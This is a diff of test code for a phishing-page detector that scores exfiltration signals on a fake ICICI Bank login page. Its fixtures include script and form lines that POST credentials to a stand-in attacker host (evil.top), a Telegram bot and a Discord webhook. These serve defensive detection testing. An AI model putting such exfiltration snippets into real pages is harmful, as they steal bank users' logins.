@@ -179,19 +179,27 @@ SPA = ("<html><head><title>ICICI Bank login</title></head><body><div id=app><inp
        f"<script>fetch('{TG}',{{method:'POST'}});fetch('https://c.evil.top/save',{{method:'POST'}})</script></body></html>")
 
 
-def test_exfil_signals_are_off_by_default():
+def test_shipped_defaults_s1_strong_s2_moderate():
+    """Owner decisions 2026-10-07/08 from the S3 gate: S1 strong (0 FP), S2 moderate (1 held-out FP). With S2 moderate
+    a JS-era kit has at most one live-capable strong signal, so it stays a candidate: never confirmed on one fact."""
     r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
-    assert not names(r) & {"credential_exfil_endpoint", "credential_post_foreign_origin_js"}
+    strengths = {s.name: s.strength for s in r.signals}
+    assert strengths["credential_exfil_endpoint"] == "strong"
+    assert strengths["credential_post_foreign_origin_js"] == "moderate"
+    assert r.strong_count == 1 and r.verdict == "candidate"
 
 
 def test_exfil_signals_at_strong_can_confirm_and_carry_their_evidence():
+    """Telegram exfil (S1) + a POST to a DIFFERENT site (S2): two artifacts, two detectors, two strong."""
     r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                      signal_strengths={"exfil": "strong", "js_post": "strong"})
     assert r.verdict == "confirmed" and r.strong_count == 2
     ex = next(s for s in r.signals if s.name == "credential_exfil_endpoint")
-    assert "telegram_bot" in ex.detail and "rendered DOM" in ex.detail
-    js = next(s for s in r.signals if s.name == "credential_post_foreign_origin_js")
-    assert "https://c.evil.top" in js.detail
+    assert "telegram_bot" in ex.detail and "rendered DOM" in ex.detail and ex.artifacts == ("endpoint:telegram.org",)
+    js = [s for s in r.signals if s.name == "credential_post_foreign_origin_js"]
+    assert {a for s in js for a in s.artifacts} == {"endpoint:telegram.org", "endpoint:evil.top"}
+    assert any("https://c.evil.top" in s.detail for s in js)
+    assert {"name", "strength", "detail", "artifacts"} <= set(r.reasons()["signals"][0])
 
 
 def test_exfil_signals_at_moderate_never_confirm_alone():
@@ -206,3 +214,44 @@ def test_one_exfil_endpoint_is_one_strong_signal_not_two():
     r = analyze_page(page(only_tg), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                      signal_strengths={"exfil": "strong", "js_post": "strong"})
     assert r.strong_count == 1 and r.verdict == "candidate"
+
+
+
+# ---- S3b: the shared independence rule -----------------------------------------------------------------------------
+from services.enrich.confirm import Signal, independent_strong  # noqa: E402
+
+
+def sig(name, *arts, strength="strong"):
+    return Signal(name, strength, "x", tuple(arts))
+
+
+def test_independent_strong_counts_distinct_detectors_on_distinct_artifacts():
+    assert independent_strong([sig("a", "endpoint:x.top"), sig("b", "dom:1")]) == 2
+    assert independent_strong([sig("a", "endpoint:x.top"), sig("b", "endpoint:x.top")]) == 1   # same artifact
+    assert independent_strong([sig("a", "endpoint:x.top"), sig("a", "endpoint:y.top")]) == 1   # same detector
+    assert independent_strong([sig("a", "endpoint:x.top"), sig("b", "dom:1", strength="moderate")]) == 1
+    assert independent_strong([]) == 0
+
+
+def test_independent_strong_picks_the_non_colliding_instance():
+    """S1 on telegram.org; S2 on telegram.org AND evil.top: S2's evil.top instance is independent -> 2."""
+    assert independent_strong([sig("s1", "endpoint:telegram.org"), sig("s2", "endpoint:telegram.org"),
+                               sig("s2", "endpoint:evil.top")]) == 2
+
+
+def test_rule_is_shared_by_the_static_form_check_too():
+    """Not a special case of S1/S2: a static form POSTing to X and the page's code POSTing to X is one observation."""
+    html = ("<html><head><title>ICICI Bank login</title></head><body><form method=post action='https://c.evil.top/p'>"
+            "<input type=password name=p></form><script>fetch('https://c.evil.top/p',{method:'POST'})</script></body></html>")
+    r = analyze_page(page(html), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
+                     signal_strengths={"exfil": "strong", "js_post": "strong"})
+    assert {"credential_post_foreign_origin", "credential_post_foreign_origin_js"} <= names(r)
+    assert r.strong_count == 1 and r.verdict == "candidate"
+
+
+def test_two_exfil_endpoints_from_one_detector_are_one_strong_signal():
+    two = SPA.replace("fetch('https://c.evil.top/save',{method:'POST'})",
+                      "x='https://discord.com/api/webhooks/123456789012345678/abcDEFghiJKL'")
+    r = analyze_page(page(two), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
+                     signal_strengths={"exfil": "strong", "js_post": "off"})
+    assert sum(s.name == "credential_exfil_endpoint" for s in r.signals) == 2 and r.strong_count == 1
